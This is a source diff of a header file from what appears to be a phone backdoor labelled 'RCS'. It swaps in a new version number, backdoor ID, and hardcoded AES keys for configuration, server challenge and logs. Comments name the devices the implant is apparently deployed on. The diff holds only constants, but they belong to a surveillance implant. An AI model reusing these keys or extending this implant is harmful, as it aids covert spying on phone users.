@@ -23,7 +23,10 @@
 //_LIT8(KVERSION,"\x61\x25\xdf\x77");		//2011112801 7.5
 //_LIT8(KVERSION,"\x81\x51\xed\x77");  //2012041601  8.0 
 //_LIT8(KVERSION,"\x82\x51\xed\x77");  //2012041602  8.04 
-_LIT8(KVERSION,"\x19\xa5\xed\x77");  //2012063001  8.1 
+//_LIT8(KVERSION,"\x19\xa5\xed\x77");  //2012063001  8.1 
+_LIT8(KVERSION,"\x1a\xa5\xed\x77");  //2012063002  8.1.4
+//_LIT8(KVERSION,"\x6d\x14\xee\x77");  //2012091501  8.2
+
 // KEY Section
 
 _LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
@@ -49,7 +52,8 @@ _LIT8(KBACKDOORID, "RCS_0000000917\x00\x00");    //backdoor su prod/castore E7-0
 //_LIT8(KBACKDOORID, "RCS_0000000061\x00\x00");	//backdoor su polluce N97Mini
 //_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");	//backdoor su demo E71
 #else
-_LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
+//_LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
+_LIT8(KBACKDOORID, "EMp7Ca7-fpOBIr\x00\x00");  //since 8.1.4
 #endif
 
 // ConfKey
@@ -74,7 +78,8 @@ _LIT8(KAES_CONFIG_KEY,"\x8c\xae\x3c\x42\x86\xe5\xab\x54\x34\x13\xcc\x92\xd7\x0b\
 //_LIT8(KAES_CONFIG_KEY,"\x29\x1e\x2a\x86\xb5\x8a\x6c\x03\x85\x92\x61\xd6\x52\xcc\xec\x8e"); //RCS_0000000061  //N97Mini polluce
 //_LIT8(KAES_CONFIG_KEY,"\xef\xca\xb8\xbc\xcf\xf0\x96\xf1\xdd\xc3\x6c\x12\x80\x36\x32\x79"); //RCS_0000000005  //E71 demo
 #else
-_LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
+//_LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
+_LIT8(KAES_CONFIG_KEY, "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY");  //since 8.1.4
 #endif
 
 //Challenge key or Signature, the same for all bkdoors on the same server
@@ -84,7 +89,8 @@ _LIT8(KAES_CHALLENGE_KEY, "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\
 //_LIT8(KAES_CHALLENGE_KEY, "\x66\x3b\xa6\x70\x50\x2a\x7b\xe4\x68\xf7\x00\x79\xfb\x69\xee\xfd"); //Signature 8.0 polluce
 //_LIT8(KAES_CHALLENGE_KEY, "840da4c68e7dbca9f927de9314e0b586"); //preprod/polluce
 #else
-_LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
+//_LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
+_LIT8(KAES_CHALLENGE_KEY, "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ");  // since 8.1.4
 #endif
 
 //Log key
@@ -113,9 +119,12 @@ _LIT8(KAES_LOGS_KEY, "\x4f\x51\x94\x26\xbb\xad\x92\x1d\xc4\x23\x25\xab\xaf\x2e\x
 //_LIT8(KAES_LOGS_KEY, "\x9b\xd7\x39\x3b\xfe\xa8\x6b\x91\x14\x66\x19\xc4\x2a\xe7\x16\x1f");  //RCS_0000000061  //N97Mini polluce
 //_LIT8(KAES_LOGS_KEY, "\x39\x17\xb7\xf0\xf1\x89\xe3\x30\x18\x13\x2e\x4a\x33\x10\xa8\x30");  //RCS_0000000005  //E71 demo
 #else
-_LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
+//_LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
+_LIT8(KAES_LOGS_KEY, "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg");  // since 8.1.4
 #endif
 
+// Random_seed, used as a random seed when/if needed
+_LIT8(KRANDOM_SEED,"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW");
 
 // UID Section
 
